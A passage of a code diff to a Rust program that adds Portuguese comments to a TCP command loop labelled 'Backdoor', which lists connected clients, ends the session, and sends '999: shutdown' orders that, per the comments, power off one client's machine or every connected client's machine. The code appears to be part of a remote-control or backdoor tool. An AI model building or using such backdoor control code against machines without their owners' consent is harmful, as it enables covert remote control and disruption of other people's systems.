@@ -304,12 +304,19 @@ loop{
                 } else {
                     log::info!("Backdoor: No command to tcp/ip");
                 }                
-                
+                //200: comando 
+                //Esse comando é executado no backdoor e é enviado para o cliente que está rodando.
+                //O cliente que está rodando executa o comando e retorna o resultado para o backdoor.
+                //O backdoor envia o resultado para o cliente que está rodando.
+                //Esse comando foi deprecado
                 if received_data.trim() == "200:" {
                     //sender_to_ger_client.send(cmdtotcp.to_string()).unwrap();
                     stream.write_all("#> ".as_bytes()).unwrap();
                     continue;
                 }
+                //Comando para terminar um cliente
+                //202:1000 comando:id do cliente
+                //Quando um cliente recebe esse comando ele dá shutdown na aplicação cliente que está rodando.                
                 if received_data.contains("202:") {
                     if received_data.trim().len() < 8 {
                         log::info!("Backdoor: You forgot client ID\n");
@@ -329,6 +336,9 @@ loop{
                             Err(e) => println!("Falha na conversão: {}", e),
                             
                         }
+                        //Comando para deligar a maquina
+                        //202:1000 comando:id do cliente
+                        //Quando um cliente recebe esse comando ele dá shutdown na máquina onde o cliente que está rodando.                
                         let shutdown: String = "999: shutdown".to_string();
                         println!("Convertido: {}", u16client_id);
                         clientdata::ClientData::send_client_msg_by_id(u16client_id,shutdown);
@@ -338,6 +348,8 @@ loop{
                     }
                     continue;
                 }
+                //Comando 201: para desligar todos os clientes conectados
+                //Quando a backdoor recebe esse comando ela envia um shutdown para todos os clientes conectados.
                 if received_data.trim() == "201:" {
                     let shutdown: String = "999: shutdown".to_string();
                     clientdata::ClientData::round_robin(shutdown);
@@ -346,6 +358,8 @@ loop{
                     stream.write_all("#> ".as_bytes()).unwrap();
                     continue;
                 }// Handle the LISTAR command
+                // L: Listar clientes conectados 
+                // Esse comando é executado no backdoor e lista todos os clientes conectados.
                 if received_data.trim() == "L" || received_data.trim() == "l" {
                     let clients = clientdata::ClientData::list_clients();
                     if clients.is_empty() {
@@ -359,6 +373,7 @@ loop{
                     }                                 
                     stream.write_all("#> ".as_bytes()).unwrap();
                 }else if received_data.trim() == "E" || received_data.trim() == "E" {
+                    //Esse comando é executado no backdoor e encerra a conexão com o backdoor.
                     log::info!("Backdoor: E cmd exiting...");               
                     stream.write_all("#> ".as_bytes()).unwrap();
                     break
